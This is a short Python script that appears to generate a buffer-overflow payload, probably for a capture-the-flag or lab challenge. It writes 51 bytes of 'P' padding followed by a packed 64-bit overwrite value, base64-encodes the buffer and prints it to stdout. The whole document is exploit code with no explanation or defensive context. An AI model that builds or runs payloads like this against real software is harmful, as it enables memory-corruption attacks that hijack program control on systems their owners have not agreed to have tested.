
import sys
import struct
import base64

buf = b'PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP'
buf += struct.pack('<Q', 2938447801119901711)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
